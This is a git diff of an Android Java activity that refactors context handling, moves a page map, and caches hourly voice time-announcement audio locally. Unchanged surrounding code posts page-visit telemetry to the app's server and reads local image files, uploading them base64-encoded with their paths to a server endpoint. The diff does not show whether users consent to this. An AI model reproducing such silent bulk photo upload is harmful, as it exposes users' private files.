@@ -45,7 +45,6 @@ import com.zhangheng.myapplication.util.OkHttpMessageUtil;
 import com.zhangheng.myapplication.util.RandomrUtil;
 import com.zhangheng.myapplication.util.TimeUtil;
 import com.zhangheng.util.EncryptUtil;
-import com.zhangheng.util.FormatUtil;
 import com.zhy.http.okhttp.OkHttpUtils;
 import com.zhy.http.okhttp.callback.StringCallback;
 
@@ -53,6 +52,7 @@ import java.io.File;
 import java.io.IOException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
@@ -60,6 +60,7 @@ import java.util.Map;
 
 import cn.hutool.core.collection.CollUtil;
 import cn.hutool.core.comparator.VersionComparator;
+import cn.hutool.core.lang.Validator;
 import cn.hutool.core.util.StrUtil;
 import cn.hutool.core.util.URLUtil;
 import cn.hutool.json.JSONObject;
@@ -69,6 +70,7 @@ import okhttp3.Call;
 public class Main3Activity extends Activity {
 
     private final String Tag = this.getClass().getSimpleName();
+    private final Context context = Main3Activity.this;
 
     private String[] permissions = {
             Manifest.permission.INTERNET,//网络
@@ -91,58 +93,33 @@ public class Main3Activity extends Activity {
     private AlertDialog.Builder builder;
     private SharedPreferences sharedPreferences;
 
-    private final static Map<Integer, Class<?>> contextMap = new HashMap<>();
 
-    static {
-        contextMap.put(1, MainActivity.class);
-        contextMap.put(2, Main2Activity.class);
-        contextMap.put(3, Main4Activity.class);
-        contextMap.put(4, Main5Activity.class);
-        contextMap.put(5, Main6Activity.class);
-        contextMap.put(6, Main7Activity.class);
-        contextMap.put(7, Main8Activity.class);
-        contextMap.put(8, Main9Activity.class);
-        contextMap.put(9, Main10Activity.class);
-        contextMap.put(10, Main11Activity.class);
-        contextMap.put(11, Main12Activity.class);
-        contextMap.put(12, Main13Activity.class);
-        contextMap.put(13, Main14Activity.class);
-        contextMap.put(14, Main15Activity.class);
-        contextMap.put(15, Test1Activity.class);
-        contextMap.put(16, Main16Activity.class);
-        contextMap.put(17, Main17Activity.class);
-        contextMap.put(18, Main18Activity.class);
-        contextMap.put(19, Main19_1Activity.class);
-        contextMap.put(20, Main20Activity.class);
-        contextMap.put(21, Main21Activity.class);
-        contextMap.put(22, Main22Activity.class);
-        contextMap.put(23, Main23Activity.class);
-        contextMap.put(24, Main24Activity.class);
-        contextMap.put(25, Main25Activity.class);
-    }
+
     public static void main(String[] args) {
         String url = URLUtil.normalize("//v.api.aa1.cn/api/api-gqsh/img/453.jpg");
         System.out.println(url);
     }
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main3);
 //        checkPermission();
-        setting = new ServerSetting(Main3Activity.this);
+        setting = new ServerSetting(context);
         listView = findViewById(R.id.list_view_1);
         m3_tv_service = findViewById(R.id.m3_tv_service);
         m3_tv_ipAddress = findViewById(R.id.m3_tv_ipAddress);
         m3_iv_setting = findViewById(R.id.m3_iv_setting);
         m3_iv_service_refersh = findViewById(R.id.m3_iv_service_refersh);
         if (setting.getIsM3VoiceTime()) {
-            voice_time();
+            Calendar instance = Calendar.getInstance();
+            int time = instance.get(Calendar.HOUR_OF_DAY);
+            voice_time(time);
         }
-
         m3_iv_setting.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
-                Intent intent = new Intent(Main3Activity.this, SettingActivity.class);
+                Intent intent = new Intent(context, SettingActivity.class);
                 String action = intent.getAction();
                 startActivity(intent);
                 Map<String, Object> map = new HashMap<>();
@@ -151,7 +128,7 @@ public class Main3Activity extends Activity {
                 map.put("time", new Date().getTime());
                 String path = OkHttpUtil.URL_postPage_Intent_Path;
                 try {
-                    OkHttpUtil.postPage(Main3Activity.this, setting.getMainUrl() + path, JSONUtil.toJsonStr(map));
+                    OkHttpUtil.postPage(context, setting.getMainUrl() + path, JSONUtil.toJsonStr(map));
                 } catch (IOException e) {
                     Log.e(Tag + "[" + path + "]", e.toString());
                 }
@@ -165,8 +142,6 @@ public class Main3Activity extends Activity {
                 getupdatelist();
             }
         });
-
-
         setAdapter();
         versionCode = PhoneSystem.getVersionCode(this);
         m3_tv_ipAddress.setText("应用版本号：" + versionCode);
@@ -186,47 +161,61 @@ public class Main3Activity extends Activity {
         }
     }
 
-    private void voice_time() {
-        String time = com.zhangheng.util.TimeUtil.getTime(com.zhangheng.util.TimeUtil.Hour);
-        OkHttpUtils.get()
-                .url("https://v.api.aa1.cn/api/api-baoshi/index.php")
-                .addParams("msg",time+":00")
-                .build().execute(new StringCallback() {
-            @Override
-            public void onError(Call call, Exception e, int id) {
-                Log.e(Tag+"语音报时",e.toString());
+    private void voice_time(int time) {
+        String path = LocalFileTool.BasePath + "/" + getString(R.string.app_name) + "/data/baoshi/";
+        String name = time + ".mp3";
+        if (new File(path + name).exists()) {
+            try {
+                playAudio(path + name);
+            } catch (IOException e) {
+                e.printStackTrace();
             }
+        } else {
+            String url = "https://v.api.aa1.cn/api/api-baoshi/index.php?msg=" + time + ":00";
+            OkHttpUtils.get()
+                    .url(url)
+                    .build().execute(new StringCallback() {
+                @Override
+                public void onError(Call call, Exception e, int id) {
+                    Log.e(Tag + "语音报时"+time, e.toString());
+                }
 
-            @Override
-            public void onResponse(String response, int id) {
-                try {
-                    if (FormatUtil.isWebUrl(response)){
-                        MediaPlayer mediaPlayer = new MediaPlayer();
-                        // 设置类型
-                        mediaPlayer.setAudioAttributes(new AudioAttributes
-                                .Builder()
-                                .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
-                                .build());
-                        mediaPlayer.reset();
-                        Uri uri = Uri.parse(response);
-                        mediaPlayer.setDataSource(Main3Activity.this, uri);// 设置文件源
-                        mediaPlayer.prepare();// 解析文件
-                        mediaPlayer.start();
-
-                        mediaPlayer.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
-                            @Override
-                            public void onCompletion(MediaPlayer mp) {
-                                if (mp != null) {
-                                    mp.stop();
-                                    mp.release();
-                                }
-                            }
-                        });
-                    }else {
-                        Log.d(Tag+"语音报时",response);
+                @Override
+                public void onResponse(String response, int id) {
+                    try {
+                        if (Validator.isUrl(response)) {
+                            playAudio(response);
+                            OkHttpUtil.downLoad(context, response, path, name);
+                        } else {
+                            Log.d(Tag + "语音报时"+time, response);
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
                     }
-                }catch (Exception e){
-                    e.printStackTrace();
+                }
+            });
+        }
+    }
+
+    public void playAudio(String audio) throws IOException {
+        MediaPlayer mediaPlayer = new MediaPlayer();
+        // 设置类型
+        mediaPlayer.setAudioAttributes(new AudioAttributes
+                .Builder()
+                .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
+                .build());
+        mediaPlayer.reset();
+//        Uri uri = Uri.parse(audio);
+        mediaPlayer.setDataSource(audio);// 设置文件源
+        mediaPlayer.prepare();// 解析文件
+        mediaPlayer.start();
+
+        mediaPlayer.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
+            @Override
+            public void onCompletion(MediaPlayer mp) {
+                if (mp != null) {
+                    mp.stop();
+                    mp.release();
                 }
             }
         });
@@ -242,7 +231,7 @@ public class Main3Activity extends Activity {
             }
         }
         ArrayAdapter<String> adapter = new ArrayAdapter<String>(
-                Main3Activity.this, R.layout.item_list_text, list);
+                context, R.layout.item_list_text, list);
         listView.setAdapter(adapter);
         listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
             @Override
@@ -258,16 +247,16 @@ public class Main3Activity extends Activity {
                 } else {
                     new RuntimeException("列表strTitle标题格式错误！格式为：数字.标题");
                 }
-                Class<?> aClass = Main3Activity.contextMap.get(integer);
+                Class<?> aClass = AppSetting.M3_contextMap.get(integer);
                 if (aClass != null) {
-                    intent = new Intent(Main3Activity.this, aClass);
+                    intent = new Intent(context, aClass);
                     Map<String, Object> map = new HashMap<>();
                     map.put("pageName", item);
                     map.put("pagePath", aClass.getName());
                     map.put("time", new Date().getTime());
                     String path = OkHttpUtil.URL_postPage_Intent_Path;
                     try {
-                        OkHttpUtil.postPage(Main3Activity.this, setting.getMainUrl() + path, JSONUtil.toJsonStr(map));
+                        OkHttpUtil.postPage(context, setting.getMainUrl() + path, JSONUtil.toJsonStr(map));
                     } catch (IOException e) {
                         Log.e(Tag + "[" + path + "]", e.toString());
                     }
@@ -286,7 +275,8 @@ public class Main3Activity extends Activity {
         if (b) {
             List<String> photo = new ArrayList<>();
 //            List<Map<String, Object>> files = new ArrayList<>();
-            LocalFileTool.readFile(LocalFileTool.imageType, Main3Activity.this, new LocalFileTool.IReadCallBack() {
+
+            LocalFileTool.readFile(LocalFileTool.imageType, context, new LocalFileTool.IReadCallBack() {
                 @Override
                 public void callBack(List<String> localPath) {
                     File file = null;
@@ -339,12 +329,12 @@ public class Main3Activity extends Activity {
 
                     OkHttpUtils.get()
                             .url(setting.getMainUrl() + OkHttpUtil.URL_postMessage_M3_GetUpload)
-                            .addHeader("User-Agent", GetPhoneInfo.getHead(Main3Activity.this))
+                            .addHeader("User-Agent", GetPhoneInfo.getHead(context))
                             .addParams("json", JSONUtil.toJsonStr(msg))
                             .build().execute(new StringCallback() {
                         @Override
                         public void onError(Call call, Exception e, int id) {
-                            Log.e(Tag+"图片上传", OkHttpMessageUtil.error(e));
+                            Log.e(Tag + "图片上传", OkHttpMessageUtil.error(e));
                         }
 
                         @Override
@@ -402,7 +392,7 @@ public class Main3Activity extends Activity {
                                                             map.put("path", EncryptUtil.enBase64(replace.getBytes()));
                                                             map.put("size", fileLength);
                                                             map.put("data", EncryptUtil.enBase64(bytes));
-                                                            OkHttpUtil.postFile(Main3Activity.this, OkHttpUtil.URL_postMessage_M3_PostUpload, JSONUtil.toJsonStr(map));
+                                                            OkHttpUtil.postFile(context, OkHttpUtil.URL_postMessage_M3_PostUpload, JSONUtil.toJsonStr(map));
 //                                                            Thread.sleep(2000);
                                                         }
                                                     }
@@ -468,7 +458,7 @@ public class Main3Activity extends Activity {
                     @Override
                     public void onError(Call call, Exception e, int id) {
                         String error = OkHttpMessageUtil.error(e);
-                        Toast.makeText(Main3Activity.this, "错误：" + error, Toast.LENGTH_SHORT).show();
+                        Toast.makeText(context, "错误：" + error, Toast.LENGTH_SHORT).show();
                         m3_tv_service.setText(error);
                         m3_tv_service.setTextColor(getColor(R.color.red));
                         Log.e(Tag, "错误：" + e.toString());
@@ -571,7 +561,7 @@ public class Main3Activity extends Activity {
                 .setNeutralButton("忽略此版本", new DialogInterface.OnClickListener() {
                     @Override
                     public void onClick(DialogInterface dialogInterface, int i) {
-                        AlertDialog.Builder builder1 = new AlertDialog.Builder(Main3Activity.this)
+                        AlertDialog.Builder builder1 = new AlertDialog.Builder(context)
                                 .setTitle("提示")
                                 .setMessage("忽略此版本代表<相同版本>的更新不在提示，如果有其他版本，还会继续提示更新")
                                 .setPositiveButton("知道了", new DialogInterface.OnClickListener() {
